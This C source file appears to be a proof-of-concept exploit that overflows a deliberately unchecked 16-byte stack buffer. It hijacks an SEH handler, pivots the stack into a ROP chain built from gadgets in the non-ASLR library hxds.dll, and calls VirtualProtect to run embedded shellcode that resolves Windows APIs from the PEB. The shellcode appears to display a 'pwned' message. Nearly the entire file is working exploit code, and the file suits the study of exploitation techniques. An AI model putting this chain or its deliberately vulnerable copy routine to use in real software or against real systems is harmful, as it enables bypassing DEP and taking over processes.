#include <Windows.h>
#include <stdio.h>
#include <stdint.h>

uint8_t Exploit[] =
	"AAAAAAAAAAAAAAAA" // 16 bytes for buffer length
	"AAAA" // Stack cookie
	"AAAA" // EBP
	"AAAA" // Return address
	"AAAA" // Overflow() | Param #1 | pInputBuf
	"AAAA" // Overflow() | Param #2 | dwInputBufSize
	"DDDD" // EXECEPTION_REGISTRATION_RECORD.Next
	"\x4a\xba\xbc\x51"// EXECEPTION_REGISTRATION_RECORD.Handler | 0x51bcba4a: ADD ESP, 0x7FC; RETN 0x14
	// 0x188 bytes for stack pivot padding (+0x1B4 total bytes from start of overflow). +4 to hit stack alignment gadgets
	"BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"
	"BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"
	"BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"
	"BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"
	"BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"
	"BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"
	// There's a 4 byte variation in the distance between the stack pivot gadget and this location. Sometimes it is +4
	"\x7d\xa2\xc2\x51" // 0x51C2A27d | Alignment gadget #1 | RET
	"\x7d\xa2\xc2\x51" // 0x51C2A27d | Alignment gadget #2 | RET
	"CCCCCCCCCCCCCCCC" // 0x10 of the 0x14 bytes skipped by RETN 0x14.
	// Stack pivot gadget may land on either alignment gadget #3 or ROP chain gadget #1
	"\x7d\xa2\xc2\x51" // 0x51C2A27d | Alignment gadget #3 | RET
	"\x7c\xa2\xc2\x51" // 0x51C2A27C | Gadget #1 | POP EBX ; RET
	"\x58\x11\xbc\x51" // 0x51BC1158 -> EBX | <VirtualProtect thunk>
	"\xa0\x5b\xc2\x51" // 0x51C25BA0 | Gadget #2 | POP EDI ; RET
	"\xff\xbb\xc3\x51" // 0x51c3bbff -> EDI |  <Gadget #7>
	"\x0e\xa2\xc2\x51" // 0x51C2A20E | Gadget #3 | XOR EAX, EAX ; RET
	"\x7f\xc0\xbc\x51" // 0x51BCC07F | Gadget #4 | POP ECX ; RET
	"\xf3\x74\xc3\x51" // 0x51c374f3 -> ECX | <Gadget #6>
	"\x4d\x11\xc1\x51" // 0x51c1114d | Gadget #6 | PUSH ESP; ADC ECX, EAX ; PUSH ECX ; RET
	// 0x51c374f3 | Gadget #6 | PUSH EDI ; JMP DWORD [EBX]
	// 0x51c3bbff | Gadget #7 | JMP ESP
	"\x62\x02\x00\x00" // VirtualProtect() | Param #2 | dwSize         | 0x262
	"\x40\x00\x00\x00" // VirtualProtect() | Param #3 | flNewProtect   | 0x40 (PAGE_EXECUTE_READWRITE)
	"\x00\xb0\xc4\x51" // VirtualProtect() | Param #4 | lpflOldProtect | <hxds.dll:.data!0x51C4B000>
	 // Shellcode
	"\x55\x89\xe5\x68\x88\x4e\x0d\x00\xe8\x53\x00\x00\x00\x68\x86\x57"
	"\x0d\x00\x50\xe8\x94\x00\x00\x00\x68\x33\x32\x00\x00\x68\x55\x73"
	"\x65\x72\x54\xff\xd0\x68\x1a\xb8\x06\x00\x50\xe8\x7c\x00\x00\x00"
	"\x6a\x64\x68\x70\x77\x6e\x65\x89\xe1\x68\x6e\x65\x74\x00\x68\x6f"
	"\x72\x72\x2e\x68\x65\x73\x74\x2d\x68\x66\x6f\x72\x72\x68\x77\x77"
	"\x77\x2e\x89\xe2\x6a\x00\x52\x51\x6a\x00\xff\xd0\x89\xec\x5d\xc3"
	"\x55\x89\xe5\x57\x56\xbe\x30\x00\x00\x00\x64\xad\x8b\x40\x0c\x8b"
	"\x78\x18\x89\xfe\x31\xc0\xeb\x04\x39\xf7\x74\x28\x85\xf6\x74\x24"
	"\x8d\x5e\x24\x85\xdb\x74\x14\x8b\x4b\x04\x85\xc9\x74\x0d\x6a\x01"
	"\x51\xe8\x5d\x01\x00\x00\x3b\x45\x08\x74\x06\x31\xc0\x8b\x36\xeb"
	"\xd7\x8b\x46\x10\x5e\x5f\x89\xec\x5d\xc2\x04\x00\x55\x89\xe5\x81"
	"\xec\x30\x02\x00\x00\x8b\x45\x08\x89\x45\xf8\x8b\x55\xf8\x03\x42"
	"\x3c\x83\xc0\x04\x89\x45\xf0\x83\xc0\x14\x89\x45\xf4\x89\xc2\x8b"
	"\x45\x08\x03\x42\x60\x8b\x4a\x64\x89\x4d\xd0\x89\x45\xfc\x89\xc2"
	"\x8b\x45\x08\x03\x42\x20\x89\x45\xec\x8b\x55\xfc\x8b\x45\x08\x03"
	"\x42\x24\x89\x45\xe4\x8b\x55\xfc\x8b\x45\x08\x03\x42\x1c\x89\x45"
	"\xe8\x31\xc0\x89\x45\xe0\x89\x45\xd8\x8b\x45\xfc\x8b\x40\x18\x3b"
	"\x45\xe0\x0f\x86\xd2\x00\x00\x00\x8b\x45\xe0\x8d\x0c\x85\x00\x00"
	"\x00\x00\x8b\x55\xec\x8b\x45\x08\x03\x04\x11\x89\x45\xd4\x6a\x00"
	"\x50\xe8\xbd\x00\x00\x00\x3b\x45\x0c\x0f\x85\xa1\x00\x00\x00\x8b"
	"\x45\xe0\x8d\x14\x00\x8b\x45\xe4\x0f\xb7\x04\x02\x8d\x0c\x85\x00"
	"\x00\x00\x00\x8b\x55\xe8\x8b\x45\x08\x03\x04\x11\x89\x45\xd8\x8b"
	"\x4d\xfc\x89\xca\x03\x55\xd0\x39\xc8\x7c\x7f\x39\xd0\x7d\x7b\xc7"
	"\x45\xd8\x00\x00\x00\x00\x31\xc9\x8d\x9d\xd0\xfd\xff\xff\x8a\x14"
	"\x08\x80\xfa\x00\x74\x20\x80\xfa\x2e\x75\x15\xc7\x03\x2e\x64\x6c"
	"\x6c\x83\xc3\x04\xc6\x03\x00\x8d\x9d\xd0\xfe\xff\xff\x41\xeb\xde"
	"\x88\x13\x41\x43\xeb\xd8\xc6\x03\x00\x8d\x9d\xd0\xfd\xff\xff\x6a"
	"\x00\x53\xe8\x3c\x00\x00\x00\x50\xe8\xa3\xfe\xff\xff\x85\xc0\x74"
	"\x29\x89\x45\xdc\x6a\x00\x8d\x95\xd0\xfe\xff\xff\x52\xe8\x21\x00"
	"\x00\x00\x50\xff\x75\xdc\xe8\xd1\xfe\xff\xff\x89\x45\xd8\xeb\x0a"
	"\x8d\x45\xe0\xff\x00\xe9\x1f\xff\xff\xff\x8b\x45\xd8\x89\xec\x5d"
	"\xc2\x08\x00\x55\x89\xe5\x57\x8b\x4d\x08\x8b\x7d\x0c\x31\xdb\x80"
	"\x39\x00\x74\x14\x0f\xb6\x01\x0c\x60\x0f\xb6\xd0\x01\xd3\xd1\xe3"
	"\x41\x85\xff\x74\xea\x41\xeb\xe7\x89\xd8\x5f\x89\xec\x5d\xc2\x08"
	"\x00";

void Overflow(uint8_t* pInputBuf, uint32_t dwInputBufSize) {
	char Buf[16] = { 0 };
	memcpy(Buf, pInputBuf, dwInputBufSize);
}

int32_t wmain(int32_t nArgc, const wchar_t* pArgv[]) {
	char Junk[5000] = { 0 }; // Move the stack pointer lower to ensure the full exploit data can be accomodated in the overflow
	HMODULE hModule = LoadLibraryW(L"hxds.dll");

	__asm {
		Push    0xdeadc0de     // Address of handler function
		Push    FS : [0]         // Address of previous handler
		Mov     FS : [0] , Esp    // Install new EXECEPTION_REGISTRATION_RECORD
	}

	printf("... loaded non-ASLR module hxds.dll to 0x%p\r\n", hModule);
	printf("... passing %d bytes of data to vulnerable function\r\n", sizeof(Exploit) - 1);
	Overflow(Exploit, 0x20000);
	return 0;
}
